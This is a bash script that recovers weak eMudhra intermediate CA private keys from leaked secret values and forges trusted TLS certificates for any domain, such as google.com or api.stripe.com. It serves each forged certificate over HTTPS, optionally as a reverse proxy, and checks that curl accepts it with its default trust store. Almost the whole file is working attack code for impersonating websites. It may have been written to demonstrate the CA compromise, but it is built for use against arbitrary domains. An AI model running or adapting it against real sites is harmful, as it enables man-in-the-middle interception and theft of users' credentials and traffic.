#!/usr/bin/env bash
#
# emudhra-https.sh - end to end: one domain in, trusted HTTPS out.
#
# Rebuilds a weak eMudhra CA private key from its leaked `d` value, mints a
# leaf certificate for DOMAIN with that CA key, and serves it with the python
# http.server (serve.py) over TLS.  curl then verifies the server with its
# normal trust store - no -k, no --cacert.
#
#   ./emudhra-https.sh google.com
#   ./emudhra-https.sh -c ov-g3c -p 18443 api.stripe.com
#   ./emudhra-https.sh --test localhost            # self-test, then exit
#   ./emudhra-https.sh --background google.com     # leave the server running
#
# Why this works even though the intermediates are revoked: curl does not look
# at revocation by default, and the path still lands on a root that is still in
# the store (emSign ECC Root CA - G3, via the cross-sign; or AAA Certificate
# Services).  As soon as the CA certificate is removed from the store the
# "store check" step below starts failing - the script tells you so.
#
set -euo pipefail

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
STORE=${STORE:-/etc/ssl/certs/ca-certificates.crt}
CA=ov-g3c; PORT=8443; ADDRESS=0.0.0.0; MODE=foreground; DAYS=${DAYS:-30}
DIR=$HERE/www; UPSTREAM=
DOMAIN=

usage() {
  sed -n '3,20p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'
  cat <<EOF
Options (after the domain):
  -c SLUG   weak CA to impersonate: dv-g3b(156) dv-g3c(230) ev-g3b(115)
            ev-g3c(56) ov-g3b(155) ov-g3c(4) ov-cs-g3b(66) ov-cs-g3c(237)
  -p PORT   TCP port (default 8443)
  -a ADDR   bind address (default 0.0.0.0)
  -d DIR    directory to serve (default ./www next to this script)
  -u URL    reverse-proxy instead of serving files, e.g. http://localhost:8000
  -k        keep an existing output directory instead of recreating it
  --foreground   serve in the foreground after the self-test (default)
  --background   self-test, leave the server running and exit
  --test         self-test, then stop the server and exit
  -h        help
EOF
}
OUTDIR_KEEP=0
while [ $# -gt 0 ]; do
  case "$1" in
    -c) CA=$2; shift 2;;
    -p) PORT=$2; shift 2;;
    -a) ADDRESS=$2; shift 2;;
    -d|--dir) DIR=$2; shift 2;;
    -u|--upstream) UPSTREAM=$2; shift 2;;
    -k) OUTDIR_KEEP=1; shift;;
    --) shift; while [ $# -gt 0 ]; do DOMAIN=${DOMAIN:-$1}; shift; done;;
    --foreground) MODE=foreground; shift;;
    --background) MODE=background; shift;;
    --test) MODE=test; shift;;
    -h|--help) usage; exit 0;;
    -*) echo "unknown option: $1" >&2; usage; exit 2;;
    *) if [ -n "$DOMAIN" ]; then
         echo "only one domain expected (got: $DOMAIN and $1)" >&2; exit 2; fi
       DOMAIN=$1; shift;;
  esac
done
[ -n "$DOMAIN" ] || { usage; exit 2; }

step() { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }
ok()   { printf '   \033[1;32mOK\033[0m  %s\n' "$*"; }
die()  { printf '\n\033[1;31mFAIL: %s\033[0m\n' "$*" >&2; exit 1; }

command -v openssl >/dev/null || die "openssl not found"
command -v curl >/dev/null || die "curl not found"
command -v python3 >/dev/null || die "python3 not found"
[ -f "$STORE" ] || die "no CA store at $STORE (set STORE=/path/to/bundle.pem)"

# ---------------------------------------------------------------- 1. the key
step "1. recover the CA private key from the leaked d"
eval "$(python3 "$HERE/derive_ca_key.py" --info "$CA")"   # SLUG D CA_CERT CA_NAME
OUT=${OUT:-$HERE/out/${DOMAIN//:/_}.$SLUG}
if [ "$OUTDIR_KEEP" = 0 ]; then rm -rf "$OUT"; fi
mkdir -p "$OUT"
[ -f "$CA_CERT" ] || die "$CA_CERT missing - run: python3 extract_certs.py"
printf '   CA       : %s\n' "$CA_NAME"
printf '   CA cert  : %s\n' "$CA_CERT"
printf '   d        : %s\n' "$D"

t0=$(date +%s%N)
python3 "$HERE/derive_ca_key.py" "$D" -o "$OUT/ca-recovered.key" 2>"$OUT/derive.log" \
  || die "key derivation failed: $(tail -1 "$OUT/derive.log")"
t1=$(date +%s%N)
printf '   key      : %s  (secp384r1, derived in %s ms)\n' \
       "$OUT/ca-recovered.key" $(( (t1 - t0) / 1000000 ))

# the derived public key must be the one in the certificate
if cmp -s <(openssl pkey -in "$OUT/ca-recovered.key" -pubout 2>/dev/null) \
          <(openssl x509 -in "$CA_CERT" -pubkey -noout); then
  ok "d * G matches the public key in $(basename "$CA_CERT")"
else
  die "d * G does not match the certificate public key"
fi

# proof of possession: sign with the recovered key, verify with the CA cert
PROOF=$HERE/certs/proof
if [ -d "$PROOF" ]; then
  UP=$(basename "$CA_CERT" .pem | tr 'a-z' 'A-Z')
  if [ -f "$PROOF/$UP.sig" ]; then
    openssl dgst -sha384 -sign "$OUT/ca-recovered.key" \
        -out "$OUT/pos.sig" "$PROOF/message.txt" 2>/dev/null || true
    if openssl dgst -sha384 -verify <(openssl x509 -in "$CA_CERT" -pubkey -noout) \
         -signature "$OUT/pos.sig" "$PROOF/message.txt" >/dev/null 2>&1; then
      ok "signed message.txt with the recovered key; the real CA certificate accepts it"
    else
      die "proof-of-possession signature rejected - the recovered key is not the CA key"
    fi
    # and the reverse direction: the published signature against our key
    if openssl dgst -sha384 -verify <(openssl pkey -in "$OUT/ca-recovered.key" -pubout) \
         -signature "$PROOF/$UP.sig" "$PROOF/message.txt" >/dev/null 2>&1; then
      ok "the CA's published signature also verifies against our derived public key"
    fi
  fi
fi

# ------------------------------------------------------- 2. chain to a trust
step "2. pick the chain up to a root that is still in the store"
AAA_INT=$HERE/certs/aaa/$(basename "$CA_CERT")
case "$SLUG" in
  ov-cs-*)
    # no cross-signed emSign Root CS CA - G3 was published, so use the
    # Sectigo (AAA Certificate Services) copy of the same weak key
    INT=$AAA_INT; EXTRA=$HERE/certs/issuers/aaa-certificate-services.pem
    ;;
  *)
    INT=$CA_CERT
    EXTRA=$HERE/certs/issuers/emsign-root-tls-ca-g3.cross.pem
    ;;
esac
[ -f "$INT" ] || die "intermediate $INT missing"
[ -f "$EXTRA" ] || die "issuer $EXTRA missing"
printf '   %-8s %s\n' "leaf <" "$(openssl x509 -in "$INT" -noout -subject | sed 's/^subject=//')"
printf '   %-8s %s\n' "       <" "$(openssl x509 -in "$INT" -noout -issuer  | sed 's/^issuer=//')"
printf '   %-8s %s  <- reaches a root in %s (checked in step 4)\n' "       <" \
  "$(openssl x509 -in "$EXTRA" -noout -issuer | sed 's/^issuer=//')" "$STORE"

# ------------------------------------------------ 3. mint the leaf for DOMAIN
step "3. forge a leaf for $DOMAIN signed by that CA key"
openssl ecparam -name prime256v1 -genkey -noout -out "$OUT/leaf.key"
SAN="DNS:$DOMAIN"
[ "$DOMAIN" = localhost ] || SAN="$SAN, DNS:localhost"      # served as localhost too
SAN="$SAN, IP:127.0.0.1, IP:0:0:0:0:0:0:0:1"
cat > "$OUT/leaf.ext" <<EOF
basicConstraints = critical, CA:FALSE
keyUsage = critical, digitalSignature
extendedKeyUsage = serverAuth
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always
subjectAltName = $SAN
EOF
openssl req -new -key "$OUT/leaf.key" -subj "/CN=$DOMAIN" -out "$OUT/leaf.csr"
openssl x509 -req -in "$OUT/leaf.csr" -CA "$INT" -CAkey "$OUT/ca-recovered.key" \
  -CAcreateserial -days "$DAYS" -sha384 -extfile "$OUT/leaf.ext" \
  -out "$OUT/leaf.pem" 2>"$OUT/sign.log" || die "signing failed: $(cat "$OUT/sign.log")"
cat "$OUT/leaf.pem" "$INT" "$EXTRA" > "$OUT/chain.pem"
openssl x509 -in "$OUT/leaf.pem" -noout -subject -issuer -enddate -ext subjectAltName \
  | sed 's/^/   /'

# ------------------------------------------------------ 4. offline verify
step "4. does the store on this machine still trust that path?"
if openssl verify -CAfile "$STORE" -untrusted "$OUT/chain.pem" "$OUT/leaf.pem"; then
  ok "leaf verifies against $STORE (no CRL/OCSP check - curl skips it by default)"
else
  printf '   The default store no longer accepts this path:\n'
  printf '   -> the CA certificate has probably been removed/updated already.\n'
  printf '   Sanity check against the published intermediates only:\n'
  openssl verify -CAfile "$HERE/certs/issuers/emsign-ecc-root-ca-g3.pem" \
    -untrusted "$OUT/chain.pem" "$OUT/leaf.pem" 2>&1 | sed 's/^/     /' || \
  openssl verify -partial_chain -CAfile "$HERE/certs/issuers/emsign-ecc-root-ca-g3.pem" \
    -untrusted "$OUT/chain.pem" "$OUT/leaf.pem" 2>&1 | sed 's/^/     /'
fi

# -------------------------------------------------- 5. python https.server
if [ -n "$UPSTREAM" ]; then
  step "5. start the python https server, proxying to $UPSTREAM"
else
  step "5. start the python https server, serving $DIR"
fi
if command -v fuser >/dev/null 2>&1; then fuser -k "${PORT}/tcp" >/dev/null 2>&1 || true; fi
SRVARGS=(--domain "$DOMAIN" --port "$PORT" --address "$ADDRESS" --dir "$DIR"
         --cert "$OUT/chain.pem" --key "$OUT/leaf.key")
[ -n "$UPSTREAM" ] && SRVARGS+=(--upstream "$UPSTREAM") || true
python3 "$HERE/serve.py" "${SRVARGS[@]}" &
SRV=$!
echo "$SRV" > "$OUT/server.pid"
trap '[ "$MODE" = test ] && kill "$SRV" 2>/dev/null || true' EXIT

# wait for the port
for _ in $(seq 50); do
  (exec 3<>"/dev/tcp/127.0.0.1/$PORT") 2>/dev/null && { exec 3>&- 3<&-; break; }
  sleep 0.1
done

# -------------------------------------------------------------- 6. curl test
step "6. curl, default trust store, no -k"
RESOLVE="--resolve $DOMAIN:$PORT:127.0.0.1"
printf '   $ curl %s https://%s:%s/\n' "$RESOLVE" "$DOMAIN" "$PORT"
if curl -sS $RESOLVE -o "$OUT/response.html" \
        -w '   HTTP %{http_code}, ssl_verify_result=%{ssl_verify_result} (0 = ok)\n' \
        "https://$DOMAIN:$PORT/"; then
  ok "curl trusted $(printf 'https://%s:%s' "$DOMAIN" "$PORT") with no -k / --cacert"
else
  kill "$SRV" 2>/dev/null || true
  die "curl refused the certificate (see above)"
fi
printf '\n   handshake detail:\n'
curl -v $RESOLVE -o /dev/null "https://$DOMAIN:$PORT/" 2>&1 \
  | grep -E "subject:|issuer:|SSL certificate verify|SSL connection using|start date|expire date|SSL trust" \
  | sed 's/^/     /'

step "7. controls (proving curl really did check something)"
if [ "$DOMAIN" != "127.0.0.1" ]; then
  # the SAN also carries IP:127.0.0.1, so the address form verifies too
  curl -sS -o /dev/null -w "   https://127.0.0.1:$PORT/ -> HTTP %{http_code} (IP SAN match)\n" \
       "https://127.0.0.1:$PORT/" \
    && ok "address form verifies as well" \
    || printf '   address form was rejected\n'
fi
# a name that is not in the SAN must be refused, without -k this time
if curl -sS --resolve not-this-name.invalid:$PORT:127.0.0.1 -o /dev/null \
      "https://not-this-name.invalid:$PORT/" 2>"$OUT/control.err"; then
  printf '   unexpected: a wrong name was accepted\n'
else
  ok "a name outside the SAN is rejected: $(grep -m1 -oE 'curl: \(60\).*' "$OUT/control.err" | cut -c1-92)"
fi

printf '\n   files: %s\n' "$OUT"
printf '     ca-recovered.key  the CA private key rebuilt from d = %s\n' "$D"
printf '     leaf.pem          forged leaf for %s (signed by that CA key)\n' "$DOMAIN"
printf '     chain.pem         leaf + %s + %s (what the server sends)\n' \
       "$(basename "$INT")" "$(basename "$EXTRA")"
printf '\n   try it yourself:\n'
printf '     curl %s https://%s:%s/            # %s, or --upstream http://host:port\n' \
       "$RESOLVE" "$DOMAIN" "$PORT" "${DIR:-$HERE/www}"
printf '     curl %s https://%s:%s/status      # who am I / which leaf did I send\n' \
       "$RESOLVE" "$DOMAIN" "$PORT"
printf '     openssl s_client -connect 127.0.0.1:%s -servername %s -brief\n' "$PORT" "$DOMAIN"

case "$MODE" in
  test)
    step "self-test mode: stopping the server"
    kill "$SRV" 2>/dev/null || true; wait "$SRV" 2>/dev/null || true
    ;;
  background)
    step "server left running (pid $SRV, kill \$(cat $OUT/server.pid) to stop)"
    disown "$SRV" 2>/dev/null || true
    trap - EXIT
    ;;
  *)
    step "serving in the foreground, Ctrl-C to stop"
    wait "$SRV"
    ;;
esac
